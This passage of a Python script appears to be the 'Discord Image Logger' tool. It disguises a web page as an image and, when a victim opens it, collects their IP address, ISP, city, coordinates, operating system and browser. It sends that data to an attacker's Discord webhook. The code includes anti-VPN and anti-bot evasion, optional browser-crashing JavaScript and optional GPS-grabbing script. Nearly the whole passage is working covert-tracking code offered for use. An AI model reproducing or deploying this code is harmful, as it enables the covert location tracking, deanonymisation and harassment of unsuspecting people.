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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
